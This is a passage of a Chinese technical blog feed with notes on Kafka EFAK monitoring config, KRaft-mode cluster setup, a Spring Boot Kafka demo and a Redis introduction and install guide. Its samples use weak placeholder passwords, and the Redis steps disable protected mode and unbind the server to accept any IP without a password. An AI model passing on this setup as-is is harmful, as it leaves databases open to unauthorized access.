kafka sasl authenticate</span></span><br><span class="line"><span class="comment">######################################</span></span><br><span class="line"><span class="attr">cluster1.efak.sasl.enable</span>=<span class="string">false</span></span><br><span class="line"><span class="attr">cluster1.efak.sasl.protocol</span>=<span class="string">SASL_PLAINTEXT</span></span><br><span class="line"><span class="attr">cluster1.efak.sasl.mechanism</span>=<span class="string">SCRAM-SHA-256</span></span><br><span class="line"><span class="attr">cluster1.efak.sasl.jaas.config</span>=<span class="string">org.apache.kafka.common.security.scram.ScramLoginModule required username=&quot;kafka&quot; password=&quot;kafka-eagle&quot;;</span></span><br><span class="line"><span class="attr">cluster1.efak.sasl.client.id</span>=<span class="string"></span></span><br><span class="line"><span class="attr">cluster1.efak.blacklist.topics</span>=<span class="string"></span></span><br><span class="line"><span class="attr">cluster1.efak.sasl.cgroup.enable</span>=<span class="string">false</span></span><br><span class="line"><span class="attr">cluster1.efak.sasl.cgroup.topics</span>=<span class="string"></span></span><br><span class="line"><span class="attr">cluster2.efak.sasl.enable</span>=<span class="string">false</span></span><br><span class="line"><span class="attr">cluster2.efak.sasl.protocol</span>=<span class="string">SASL_PLAINTEXT</span></span><br><span class="line"><span class="attr">cluster2.efak.sasl.mechanism</span>=<span class="string">PLAIN</span></span><br><span class="line"><span class="attr">cluster2.efak.sasl.jaas.config</span>=<span class="string">org.apache.kafka.common.security.plain.PlainLoginModule required username=&quot;kafka&quot; password=&quot;kafka-eagle&quot;;</span></span><br><span class="line"><span class="attr">cluster2.efak.sasl.client.id</span>=<span class="string"></span></span><br><span class="line"><span class="attr">cluster2.efak.blacklist.topics</span>=<span class="string"></span></span><br><span class="line"><span class="attr">cluster2.efak.sasl.cgroup.enable</span>=<span class="string">false</span></span><br><span class="line"><span class="attr">cluster2.efak.sasl.cgroup.topics</span>=<span class="string"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">######################################</span></span><br><span class="line"><span class="comment"># kafka ssl authenticate</span></span><br><span class="line"><span class="comment">######################################</span></span><br><span class="line"><span class="attr">cluster3.efak.ssl.enable</span>=<span class="string">false</span></span><br><span class="line"><span class="attr">cluster3.efak.ssl.protocol</span>=<span class="string">SSL</span></span><br><span class="line"><span class="attr">cluster3.efak.ssl.truststore.location</span>=<span class="string"></span></span><br><span class="line"><span class="attr">cluster3.efak.ssl.truststore.password</span>=<span class="string"></span></span><br><span class="line"><span class="attr">cluster3.efak.ssl.keystore.location</span>=<span class="string"></span></span><br><span class="line"><span class="attr">cluster3.efak.ssl.keystore.password</span>=<span class="string"></span></span><br><span class="line"><span class="attr">cluster3.efak.ssl.key.password</span>=<span class="string"></span></span><br><span class="line"><span class="attr">cluster3.efak.ssl.endpoint.identification.algorithm</span>=<span class="string">https</span></span><br><span class="line"><span class="attr">cluster3.efak.blacklist.topics</span>=<span class="string"></span></span><br><span class="line"><span class="attr">cluster3.efak.ssl.cgroup.enable</span>=<span class="string">false</span></span><br><span class="line"><span class="attr">cluster3.efak.ssl.cgroup.topics</span>=<span class="string"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">######################################</span></span><br><span class="line"><span class="comment"># kafka sqlite jdbc driver address</span></span><br><span class="line"><span class="comment">######################################</span></span><br><span class="line"><span class="comment">#efak.driver=org.sqlite.JDBC</span></span><br><span class="line"><span class="comment">#efak.url=jdbc:sqlite:/hadoop/kafka-eagle/db/ke.db</span></span><br><span class="line"><span class="comment">#efak.username=root</span></span><br><span class="line"><span class="comment">#efak.password=www.kafka-eagle.org</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">######################################</span></span><br><span class="line"><span class="comment"># kafka mysql jdbc driver address</span></span><br><span class="line"><span class="comment">######################################</span></span><br><span class="line"><span class="attr">efak.driver</span>=<span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line"><span class="attr">efak.url</span>=<span class="string">jdbc:mysql://127.0.0.1:3306/ke?useUnicode=true&amp;characterEncoding=UTF-8&amp;zeroDateTimeBehavior=convertToNull</span></span><br><span class="line"><span class="attr">efak.username</span>=<span class="string">root</span></span><br><span class="line"><span class="attr">efak.password</span>=<span class="string">123456</span></span><br></pre></td></tr></table></figure><ul><li><p>配置环境变量<code>vi /etc/profile</code>：</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># kafkaEFAK</span></span><br><span class="line"><span class="attr">export</span> <span class="string">KE_HOME=/opt/efak</span></span><br><span class="line"><span class="attr">export</span> <span class="string">PATH=$PATH:$KE_HOME/bin</span></span><br></pre></td></tr></table></figure><p>使环境变量生效：<code>source /etc/profile</code></p></li><li><p>启动：<code>[root@nanzx efak]# bin/ke.sh start</code></p><ul><li>注意：启动之前需要先启动 ZK 以及 KAFKA</li></ul></li><li><p>登录页面查看监控数据：<a href="http://192.168.2.110:8048/">http://192.168.2.110:8048/</a></p><ul><li>启动成功后控制台会打印出用户名密码和HTTP访问地址相关信息。要注意的是，<strong>启动失败</strong>也会打印出这些信息，所以得通过链接访问成功了才能判断启动没问题。</li></ul></li></ul><h1 id="Kafka-Kraft-模式"><a href="#Kafka-Kraft-模式" class="headerlink" title="Kafka-Kraft 模式"></a>Kafka-Kraft 模式</h1><h2 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h2><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220319193800.png"></p><p>左图为 Kafka 现有架构，元数据在 zookeeper 中，运行时动态选举 controller，由controller 进行 Kafka 集群管理。右图为 kraft 模式架构（实验性），不再依赖 zookeeper 集群，而是用三台 controller 节点代替 zookeeper，元数据保存在 controller 中，由 controller 直接进行 Kafka 集群管理。</p><p>这样做的好处有以下几个： </p><ul><li><p>Kafka 不再依赖外部框架，而是能够独立运行； </p></li><li><p>controller 管理集群时，不再需要从 zookeeper 中先读取数据，集群性能上升； </p></li><li><p>由于不依赖 zookeeper，集群扩展时不再受到 zookeeper 读写能力限制； </p></li><li><p>controller <strong>不再动态选举</strong>，而是由配置文件规定。这样我们可以有针对性的加强controller 节点的配置，而不是像以前一样对随机 controller 节点的高负载束手无策。</p></li></ul><h2 id="安装部署-1"><a href="#安装部署-1" class="headerlink" title="安装部署"></a>安装部署</h2><p>安装Kafka，以前是进入config目录修改配置文件 server.properties，现在是修改&#x2F;config&#x2F;<strong>kraft</strong>&#x2F;server.properties 配置文件：</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#kafka的角色（controller相当于主机、broker节点相当于从机，主机类似 zk 功 能）</span></span><br><span class="line"><span class="attr">process.roles</span>=<span class="string">broker, controller</span></span><br><span class="line"><span class="comment">#节点ID，不能重复</span></span><br><span class="line"><span class="attr">node.id</span>=<span class="string">2</span></span><br><span class="line"><span class="comment">#controller 服务协议别名</span></span><br><span class="line"><span class="attr">controller.listener.names</span>=<span class="string">CONTROLLER</span></span><br><span class="line"><span class="comment">#全 Controller 列表，前面需要加node.id</span></span><br><span class="line"><span class="attr">controller.quorum.voters</span>=<span class="string">2@hadoop102:9093,3@hadoop103:9093,4@hadoop104:9093</span></span><br><span class="line"><span class="comment">#不同服务器绑定的端口</span></span><br><span class="line"><span class="attr">listeners</span>=<span class="string">PLAINTEXT://:9092,CONTROLLER://:9093</span></span><br><span class="line"><span class="comment">#broker 服务协议别名</span></span><br><span class="line"><span class="attr">inter.broker.listener.name</span>=<span class="string">PLAINTEXT</span></span><br><span class="line"><span class="comment">#broker 对外暴露的地址</span></span><br><span class="line"><span class="attr">advertised.Listeners</span>=<span class="string">PLAINTEXT://hadoop102:9092</span></span><br><span class="line"><span class="comment">#协议别名到安全协议的映射</span></span><br><span class="line"><span class="attr">listener.security.protocol.map</span>=<span class="string">CONTROLLER:PLAINTEXT,PLAINTEXT:PLA</span></span><br><span class="line"><span class="attr">INTEXT,SSL</span>:<span class="string">SSL,SASL_PLAINTEXT:SASL_PLAINTEXT,SASL_SSL:SASL_SSL</span></span><br><span class="line"><span class="comment">#kafka 数据存储目录</span></span><br><span class="line"><span class="attr">log.dirs</span>=<span class="string">/opt/kafka2/data</span></span><br></pre></td></tr></table></figure><p>初始化集群数据目录：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">首先生成存储目录唯一 ID。</span></span><br><span class="line">[nanzx kafka2]$ bin/kafka-storage.sh random-uuid</span><br><span class="line">J7s9e8PPTKOO47PxzI39VA</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">用该 ID 格式化 kafka 存储目录（三台节点）。</span></span><br><span class="line">[nanzx kafka2]$ bin/kafka-storage.sh format -t J7s9e8PPTKOO47PxzI39VA -c </span><br><span class="line">/opt/kafka2/config/kraft/server.properties</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动 kafka 集群</span></span><br><span class="line">[nanzx kafka2]$ bin/kafka-server-start.sh -daemon config/kraft/server.properties</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">停止 kafka 集群</span></span><br><span class="line">[nanzx kafka2]$ bin/kafka-server-stop.sh</span><br></pre></td></tr></table></figure><h1 id="Kafka整合SpringBoot-Demo"><a href="#Kafka整合SpringBoot-Demo" class="headerlink" title="Kafka整合SpringBoot Demo"></a>Kafka整合SpringBoot Demo</h1><p>引入依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.kafka<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-kafka<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.8.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.kafka<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-kafka-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.8.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>修改配置文件：</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 应用名称</span></span><br><span class="line"><span class="attr">spring.application.name</span>=<span class="string">Learn_Kafka</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># 生产者配置</span></span><br><span class="line"><span class="attr">spring.kafka.bootstrap-servers</span>=<span class="string">192.168.2.110:9092</span></span><br><span class="line"><span class="attr">spring.kafka.producer.key-serializer</span>=<span class="string">org.apache.kafka.common.serialization.StringSerializer</span></span><br><span class="line"><span class="attr">spring.kafka.producer.value-serializer</span>=<span class="string">org.apache.kafka.common.serialization.StringSerializer</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#消费者配置</span></span><br><span class="line"><span class="attr">spring.kafka.consumer.key-deserializer</span>=<span class="string">org.apache.kafka.common.serialization.StringDeserializer</span></span><br><span class="line"><span class="attr">spring.kafka.consumer.value-deserializer</span>=<span class="string">org.apache.kafka.common.serialization.StringDeserializer</span></span><br><span class="line"><span class="attr">spring.kafka.consumer.group-id</span>=<span class="string">nanzx</span></span><br></pre></td></tr></table></figure><p>生产者：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyProducer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> KafkaTemplate&lt;String,String&gt; kafkaTemplate;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/producer/&#123;message&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sendMessage1</span><span class="params">(<span class="meta">@PathVariable(&quot;message&quot;)</span> String normalMessage)</span> &#123;</span><br><span class="line">        kafkaTemplate.send(<span class="string">&quot;firstTopic&quot;</span>, normalMessage);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>消费者：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyConsumer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@KafkaListener(topics = &quot;firstTopic&quot;)</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">consume</span><span class="params">(ConsumerRecord&lt;?, ?&gt; record)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;简单消费：&quot;</span> + record.topic() + <span class="string">&quot;-&quot;</span> + record.partition() + <span class="string">&quot;-&quot;</span> + record.value());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><strong>SpringBoot集成kafka全面实战：</strong><a href="https://blog.csdn.net/yuanlong122716/article/details/105160545/">https://blog.csdn.net/yuanlong122716/article/details/105160545/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Kafka </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kafka </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis</title>
      <link href="/posts/27273/"/>
      <url>/posts/27273/</url>
      
        <content type="html"><![CDATA[<blockquote><p>参考视频：【尚硅谷】Redis 6 入门到精通超详细教程  <a href="https://www.bilibili.com/video/BV1Rv41177Af">https://www.bilibili.com/video/BV1Rv41177Af</a></p></blockquote><h1 id="NoSQL数据库简介"><a href="#NoSQL数据库简介" class="headerlink" title="NoSQL数据库简介"></a>NoSQL数据库简介</h1><h2 id="技术发展"><a href="#技术发展" class="headerlink" title="技术发展"></a>技术发展</h2><p>技术的分类</p><ol><li><p>解决功能性的问题：Java、Jsp、RDBMS、Tomcat、HTML、Linux、JDBC、SVN</p></li><li><p>解决扩展性的问题：Struts、Spring、SpringMVC、Hibernate、Mybatis</p></li><li><p>解决性能的问题：NoSQL、Java线程、Hadoop、Nginx、MQ、ElasticSearch</p></li></ol><p>Web1.0的时代，数据访问量很有限，用一夫当关的高性能的单点服务器可以解决大部分问题。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220131121351.png"></p><p>随着Web2.0的时代的到来，用户访问量大幅度提升，同时产生了大量的用户数据。加上后来的智能移动设备的普及，所有的互联网平台都面临了巨大的性能挑战。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220131121400.png"></p><p>解决CPU及内存压力：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220131121438.png"></p><p>解决IO压力：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220131121501.png"></p><h2 id="NoSQL数据库"><a href="#NoSQL数据库" class="headerlink" title="NoSQL数据库"></a>NoSQL数据库</h2><p>NoSQL(NoSQL &#x3D; Not Only SQL )，意即“不仅仅是SQL”，泛指<strong>非关系型的数据库</strong>。 </p><p>NoSQL 不依赖业务逻辑方式存储，而以简单的<code>key-value</code>模式存储。因此大大的增加了数据库的扩展能力。</p><ul><li><p>不遵循SQL标准。</p></li><li><p>不支持<a href="https://baike.baidu.com/item/acid/10738?fr=aladdin">ACID</a>。</p></li><li><p>远超于SQL的性能。</p></li></ul><p><strong>适用场景：</strong></p><ul><li><p>对数据高并发的读写</p></li><li><p>海量数据的读写</p></li><li><p>对数据高可扩展性的</p></li></ul><p><strong>不适用场景：</strong></p><ul><li><p>需要事务支持</p></li><li><p>基于sql的结构化查询存储，处理复杂的关系,需要<a href="https://baike.baidu.com/item/%E5%8D%B3%E5%B8%AD%E6%9F%A5%E8%AF%A2/2886987?fr=aladdin">即席查询</a>。</p></li></ul><blockquote><p>用不着sql的和用了sql也不行的情况，请考虑用NoSql</p></blockquote><hr><p>常见NoSQL数据库：</p><ul><li><p>Memcache：</p><ul><li><p>很<strong>早</strong>出现的NoSql数据库</p></li><li><p>数据都在内存中，一般<strong>不持久化</strong></p></li><li><p>支持简单的key-value模式，<strong>支持类型单一</strong></p></li><li><p>一般是作为<strong>缓存数据库</strong>辅助持久化的数据库</p></li></ul></li><li><p>Redis：</p><ul><li>几乎覆盖了Memcached的绝大部分功能</li><li>数据都在内存中，<strong>支持持久化</strong>，主要用作备份恢复</li><li>除了支持简单的key-value模式，还<strong>支持多种数据结构的存储</strong>，比如 list、set、hash、zset等</li><li>一般是作为<strong>缓存数据库</strong>辅助持久化的数据库</li></ul></li><li><p>MongoDB：</p><ul><li>高性能、开源、模式自由(schema  free)的<strong>文档型数据库</strong></li><li>数据都在内存中， 如果内存不足，把不常用的数据保存到硬盘</li><li>虽然是key-value模式，但是对value（尤其是<strong>json</strong>）提供了丰富的查询功能</li><li>支持二进制数据及大型对象</li><li>可以根据数据的特点替代<strong>RDBMS</strong> ，成为独立的数据库。或者配合<a href="https://baike.baidu.com/item/%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/11032386?fromtitle=RDBMS&fromid=1048260&fr=aladdin">RDBMS</a>，存储特定的数据。</li></ul></li></ul><blockquote><p>DB-Engines 数据库排名：<a href="https://db-engines.com/en/ranking">https://db-engines.com/en/ranking</a></p></blockquote><h2 id="行式存储数据库（大数据时代）"><a href="#行式存储数据库（大数据时代）" class="headerlink" title="行式存储数据库（大数据时代）"></a>行式存储数据库（大数据时代）</h2><p>行式数据库：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220131123356.png"></p><hr><p>列式数据库：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220131123418.png"></p><ul><li><p>HBase：</p><ul><li>HBase是<strong>Hadoop</strong>项目中的数据库。它用于需要对大量的数据进行随机、实时的读写操作的场景中。HBase的目标就是处理数据量<strong>非常庞大</strong>的表，可以用<strong>普通的计算机</strong>处理超过<strong>10亿行数据</strong>，还可处理有数百万<strong>列</strong>元素的数据表。</li></ul></li><li><p>Cassandra：</p><ul><li>Apache Cassandra是一款免费的开源NoSQL数据库，其设计目的在于管理由大量商用服务器构建起来的庞大集群上的**海量数据集(数据量通常达到PB级别)**。在众多显著特性当中，Cassandra最为卓越的长处是对写入及读取操作进行规模调整，而且其不强调主集群的设计思路能够以相对直观的方式简化各集群的创建与扩展流程。</li></ul></li></ul><hr><h2 id="图关系型数据库"><a href="#图关系型数据库" class="headerlink" title="图关系型数据库"></a>图关系型数据库</h2><p>主要应用：社会关系，公共交通网络，地图及网络拓谱(n*(n-1)&#x2F;2)</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220131124227.png"></p><h2 id="计算机存储单位"><a href="#计算机存储单位" class="headerlink" title="计算机存储单位"></a>计算机存储单位</h2><p><strong>位 bit</strong> (比特)(Binary Digits)：存放一位二进制数，即 0 或 1，最小的存储单位。</p><p><strong>字节 byte</strong>：8个二进制位为一个字节(B)，最常用的单位。</p><p>计算机存储单位一般用B，KB，MB，GB，TB，EB，ZB，YB，BB来表示，它们之间的关系是：</p><p>1KB (Kilobyte 千字节)&#x3D;1024B，</p><p>1MB (Megabyte 兆字节 简称“兆”)&#x3D;1024KB，</p><p>1GB (Gigabyte 吉字节 又称“千兆”)&#x3D;1024MB，</p><p>1TB (Trillionbyte 万亿字节 太字节)&#x3D;1024GB，其中1024&#x3D;2^10 ( 2 的10次方)，</p><p><strong>1PB</strong>（Petabyte 千万亿字节 拍字节）&#x3D;1024TB，</p><p>1EB（Exabyte 百亿亿字节 艾字节）&#x3D;1024PB，</p><p>1ZB (Zettabyte 十万亿亿字节 泽字节)&#x3D; 1024 EB,</p><p>1YB (Jottabyte 一亿亿亿字节 尧字节)&#x3D; 1024 ZB,</p><p>1BB (Brontobyte 一千亿亿亿字节)&#x3D; 1024 YB.</p><p>注：“兆”为百万级数量单位。</p><h1 id="Redis概述安装"><a href="#Redis概述安装" class="headerlink" title="Redis概述安装"></a>Redis概述安装</h1><h2 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h2><ul><li><p>Redis是一个C语言实现的开源<strong>key-value</strong>存储系统，默认端口是<strong>6379</strong>。</p></li><li><p>和Memcached类似，它支持存储的value类型相对更多，包括string(字符串)、list(链表)、set(集合)、zset(sorted set –有序集合)和hash（哈希类型）。</p></li><li><p>这些数据类型都支持push&#x2F;pop、add&#x2F;remove及取交集并集和差集及更丰富的操作，这些操作都是<strong>原子性</strong>的。</p></li><li><p>在此基础上，Redis支持各种不同方式的<strong>排序</strong>。</p></li><li><p>与memcached一样，为了保证效率，数据都是<strong>缓存在内存</strong>中。区别的是Redis会<strong>周期性</strong>的把更新的数据写入磁盘或者把修改操作写入追加的记录文件。并且在此基础上实现了**master-slave(主从)**同步。</p></li><li><p>默认16个数据库，类似数组下标从0开始，初始默认使用0号库，使用命令 select  <dbid>来切换数据库。统一密码管理，所有库同样密码。</p></li></ul><hr><p><strong>原子性：</strong>有一个失败则都失败</p><p><strong>原子操作</strong>是指不会被线程调度机制打断的操作；这种操作一旦开始，就一直运行到结束，中间不会有任何 context switch （切换到另一个线程）。</p><p>（1）在单线程中， 能够在单条指令中完成的操作都可以认为是”原子操作”，因为中断只能发生于指令之间。</p><p>（2）在多线程中，不能被其它进程（线程）打断的操作就叫原子操作。</p><p>Redis单命令的原子性主要得益于Redis的单线程。</p><hr><p>Redis是<strong>单线程+多路IO复用技术</strong></p><p>多路复用是指使用一个线程来检查多个文件描述符（Socket）的就绪状态，比如调用select和poll函数，传入多个文件描述符，如果有一个文件描述符就绪，则返回，否则阻塞直到超时。得到就绪状态后进行真正的操作可以在同一个线程里执行，也可以启动线程执行（比如使用线程池）</p><p>串行  vs  多线程+锁（Memcache） vs  单线程+多路IO复用(Redis)</p><blockquote><p>Redis与Memcache三点不同: 支持多数据类型，支持持久化，单线程+多路IO复用</p></blockquote><h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><p>配合关系型数据库做高速缓存：</p><ul><li>高频次，热门访问的数据，降低数据库IO</li><li>分布式架构，做session共享</li></ul><p>多样的数据结构存储持久化数据：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220131125146.png"></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><table><thead><tr><th>Redis官方网站</th><th>Redis中文官方网站</th></tr></thead><tbody><tr><td><a href="http://redis.io/">http://redis.io</a></td><td><a href="http://redis.cn/">http://redis.cn/</a></td></tr></tbody></table><ul><li><p>在官网下载压缩包：redis-6.2.6.tar.gz</p></li><li><p>通过xftp软件将压缩包上传到linux</p></li><li><p>安装C语言的编译环境以及gcc编译器</p><ul><li><code>yum install centos-release-scl scl-utils-build</code></li><li><code>yum install -y devtoolset-8-toolchain</code></li><li><code>scl enable devtoolset-8 bash</code></li></ul></li><li><p>测试gcc版本：<code>gcc --version</code></p><ul><li>低版本可能安装不了redis：gcc (GCC) 8.3.1 20190311 (Red Hat 8.3.1-3)</li></ul></li><li><p>解压至opt目录下：<code>tar -zxvf redis-6.2.6.tar.gz -C /opt/</code></p></li><li><p>进入redis目录：<code>cd /opt/redis-6.2.6/</code></p></li><li><p>执行<code>make</code>命令进行编译，成功后再执行<code>make install</code>进行安装</p></li></ul><h2 id="查看默认安装目录"><a href="#查看默认安装目录" class="headerlink" title="查看默认安装目录"></a>查看默认安装目录</h2><p>查看默认安装目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@nanzx redis-6.2.6]# cd /usr/local/bin</span><br><span class="line">[root@nanzx bin]# ls</span><br><span class="line">docker-compose  redis-benchmark  redis-check-aof  redis-check-rdb  redis-cli  redis-sentinel  redis-server</span><br></pre></td></tr></table></figure><p>redis-benchmark：性能测试工具，可以在自己电脑运行，看看自己电脑性能如何</p><p>redis-check-aof：修复有问题的AOF文件</p><p>redis-check-dump：修复有问题的dump.rdb文件</p><p>redis-sentinel：Redis集群使用</p><p>redis-server：Redis服务器启动命令</p><p>redis-cli：客户端，操作入口</p><h2 id="启动及关闭"><a href="#启动及关闭" class="headerlink" title="启动及关闭"></a>启动及关闭</h2><p>前台启动，命令行窗口不能关闭，否则服务器停止，<code>ctrl+C</code>退出服务：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@nanzx bin]# redis-server</span><br></pre></td></tr></table></figure><p>后台启动，<strong>推荐</strong>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">[root@nanzx bin]# cd /opt/redis-6.2.6/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 备份redis配置文件</span></span></span><br><span class="line">[root@nanzx redis-6.2.6]# cp redis.conf redis.conf.bak</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 修改redis.conf(257行)文件将里面的daemonize no改成 yes，让服务在后台启动</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 为了后面远程操作才可以执行</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 将本机访问保护模式(94行)protected-mode yes改成no</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 注释掉(75行)bind 127.0.0.1 -::1，无限制接受任何ip地址的访问</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 进入后可以输入：/daemon 进行查找</span></span></span><br><span class="line">[root@nanzx redis-6.2.6]# vim redis.conf</span><br><span class="line"><span class="meta prompt_"></span></span><br><span 